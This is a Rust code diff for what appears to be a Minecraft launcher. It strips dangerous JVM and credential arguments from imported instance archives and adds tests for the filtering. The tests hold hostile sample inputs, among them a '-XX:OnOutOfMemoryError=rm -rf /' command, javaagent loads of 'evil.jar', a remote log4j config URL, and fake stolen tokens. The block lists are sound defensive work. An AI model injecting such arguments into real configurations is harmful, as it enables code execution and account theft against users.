@@ -241,10 +241,95 @@ pub fn read_export_manifest(zip_path: &Path) -> Result<InstanceExportManifest> {
     Ok(serde_json::from_str(&s)?)
 }
 
+const BLOCKED_JVM_PREFIXES: &[&str] = &[
+    "-javaagent",
+    "-agentlib",
+    "-agentpath",
+    "-xbootclasspath",
+    "-xx:onoutofmemoryerror",
+    "-xx:onerror",
+    "-xx:onrangecheckexception",
+    "-dlog4j.configurationfile",
+    "-dlog4j2.configurationfile",
+    "-djava.util.logging.config.file",
+    "-dlogback.configurationfile",
+    "--patch-module",
+    "--upgrade-module-path",
+    "--add-opens",
+    "--add-exports",
+    "--add-reads",
+];
+
+const BLOCKED_GAME_ARGS: &[&str] = &[
+    "--accesstoken",
+    "--xboxaccesstoken",
+    "--uuid",
+    "--username",
+    "--sessionid",
+    "--xuid",
+    "--clientid",
+    "--usertype",
+    "--server",
+    "--quickplaypath",
+    "--quickplaysingleplayer",
+    "--quickplaymultiplayer",
+    "--quickplayrealms",
+    "--demo",
+];
+
+fn is_blocked_jvm_arg(arg: &str) -> bool {
+    let lower = arg.trim().to_ascii_lowercase();
+    if lower.starts_with('@') {
+        return true;
+    }
+    BLOCKED_JVM_PREFIXES
+        .iter()
+        .any(|prefix| lower.starts_with(prefix))
+}
+
+fn is_blocked_game_arg(arg: &str) -> bool {
+    let lower = arg.trim().to_ascii_lowercase();
+    let name = lower.split('=').next().unwrap_or(&lower);
+    BLOCKED_GAME_ARGS
+        .iter()
+        .any(|blocked| name == *blocked || lower.starts_with(&format!("{blocked} ")))
+}
+
+fn sanitize_imported_args(jvm_args: &str, game_args: &str) -> (String, String, Vec<String>) {
+    let mut stripped = Vec::new();
+    let mut jvm_kept = Vec::new();
+    for arg in crate::minecraft::arguments::split_user_args(jvm_args) {
+        if is_blocked_jvm_arg(&arg) {
+            stripped.push(arg);
+        } else {
+            jvm_kept.push(arg);
+        }
+    }
+    let mut game_kept = Vec::new();
+    let mut consume_next = false;
+    for arg in crate::minecraft::arguments::split_user_args(game_args) {
+        if consume_next {
+            consume_next = false;
+            stripped.push(arg);
+        } else if is_blocked_game_arg(&arg) {
+            stripped.push(arg.clone());
+            consume_next = !arg.to_ascii_lowercase().contains('=');
+        } else {
+            game_kept.push(arg);
+        }
+    }
+    (jvm_kept.join(" "), game_kept.join(" "), stripped)
+}
+
+pub struct ImportReport {
+    pub config: InstanceConfig,
+    pub stripped_args: Vec<String>,
+}
+
 pub fn import_instance_export(
     manager: &crate::instance::manager::InstanceManager,
     zip_path: &Path,
-) -> Result<InstanceConfig> {
+) -> Result<ImportReport> {
     use std::io::Read as _;
     let manifest = read_export_manifest(zip_path)?;
     if manifest.format_version != 1 {
@@ -286,8 +371,10 @@ pub fn import_instance_export(
     };
     cfg.memory_min_mb = manifest.instance.memory_min_mb;
     cfg.memory_max_mb = manifest.instance.memory_max_mb;
-    cfg.jvm_args = manifest.instance.jvm_args.clone();
-    cfg.game_args = manifest.instance.game_args.clone();
+    let (jvm_args, game_args, stripped_args) =
+        sanitize_imported_args(&manifest.instance.jvm_args, &manifest.instance.game_args);
+    cfg.jvm_args = jvm_args;
+    cfg.game_args = game_args;
     cfg.width = manifest.instance.width;
     cfg.height = manifest.instance.height;
     cfg.fullscreen = manifest.instance.fullscreen;
@@ -366,7 +453,10 @@ pub fn import_instance_export(
         }
     }
     guard.committed = true;
-    Ok(cfg)
+    Ok(ImportReport {
+        config: cfg,
+        stripped_args,
+    })
 }
 
 #[cfg(test)]
@@ -404,7 +494,7 @@ mod tests {
             &Default::default(),
         )
         .unwrap();
-        let imported = import_instance_export(&manager, &export).unwrap();
+        let imported = import_instance_export(&manager, &export).unwrap().config;
         assert_ne!(imported.id, original.id);
         assert_eq!(imported.loader_version, "0.19.5");
         assert_eq!(
@@ -487,5 +577,81 @@ mod tests {
         assert!(txt.contains("Total mods: 2"));
         assert!(txt.contains("• Sodium (0.5.8)"));
         assert!(txt.contains("• Iris Shaders (1.7.0)"));
+    }
+
+    #[test]
+    fn imported_archives_cannot_inject_jvm_or_credential_arguments() {
+        let hostile_jvm = "-javaagent:/tmp/evil.jar -XX:OnOutOfMemoryError=rm -rf / \
+             -agentlib:payload -Xbootclasspath/a:/tmp/evil.jar -Dlog4j2.configurationFile=http://evil/x.xml \
+             -Djava.util.logging.config.file=/tmp/jul.properties -Dlogback.configurationFile=/tmp/lb.xml \
+             --add-opens java.base/java.lang=ALL-UNNAMED @/tmp/args -XX:OnError=/tmp/boom \
+             -Xmx4G -XX:+UseG1GC -Dfile.encoding=UTF-8 -agentpath:/tmp/evil.so";
+        let hostile_game =
+            "--accessToken stolen-token-value --uuid 11111111-2222-3333-4444-555555555555 \
+             --username Attacker --server evil.example --quickPlaySingleplayer Secret \
+             --xboxAccessToken xbl-secret-value --xuid 1234567890 --clientId msapp-id --userType mojang \
+             --width 1280 --height 720";
+        let (jvm, game, stripped) = sanitize_imported_args(hostile_jvm, hostile_game);
+        for forbidden in [
+            "javaagent",
+            "OnOutOfMemoryError",
+            "agentlib",
+            "agentpath",
+            "Xbootclasspath",
+            "log4j2.configurationFile",
+            "java.util.logging.config.file",
+            "logback.configurationFile",
+            "add-opens",
+            "stolen-token-value",
+            "xbl-secret-value",
+            "1234567890",
+            "msapp-id",
+            "11111111-2222-3333-4444-555555555555",
+            "Attacker",
+            "evil.example",
+            "Secret",
+            "evil.jar",
+            "evil.so",
+            "/tmp/args",
+            "rm -rf",
+        ] {
+            assert!(
+                !jvm.contains(forbidden) && !game.contains(forbidden),
+                "{forbidden} survived import sanitisation"
+            );
+        }
+        assert!(!stripped.is_empty());
+        assert!(jvm.contains("-Xmx4G"));
+        assert!(jvm.contains("-XX:+UseG1GC"));
+        assert!(jvm.contains("-Dfile.encoding=UTF-8"));
+        assert!(game.contains("--width 1280"));
+        assert!(game.contains("--height 720"));
+    }
+
+    #[test]
+    fn imported_arguments_are_case_and_spacing_tolerant() {
+        let (jvm, game, stripped) = sanitize_imported_args(
+            "-JavaAgent:/tmp/evil.jar -javaagent:/tmp/evil2.jar",
+            "--AccessToken  stolen --USERNAME=Attacker --width 800",
+        );
+        assert_eq!(jvm, "");
+        assert_eq!(game, "--width 800");
+        assert_eq!(stripped.len(), 5);
+        assert!(stripped.contains(&"--AccessToken".to_string()));
+        assert!(stripped.contains(&"stolen".to_string()));
+        assert!(stripped.contains(&"--USERNAME=Attacker".to_string()));
+    }
+
+    #[test]
+    fn harmless_imported_arguments_are_preserved_verbatim() {
+        let (jvm, game, stripped) = sanitize_imported_args(
+            "-Xms1G -Xmx4G -XX:+UseG1GC -Djava.library.path=natives -Dsun.java.command=x",
+            "--width 1280 --height 720 --fullscreen",
+        );
+        assert!(jvm.contains("-Xmx4G"));
+        assert!(jvm.contains("-XX:+UseG1GC"));
+        assert!(jvm.contains("-Djava.library.path=natives"));
+        assert!(game.contains("--fullscreen"));
+        assert!(stripped.is_empty(), "stripped {stripped:?}");
     }
 }
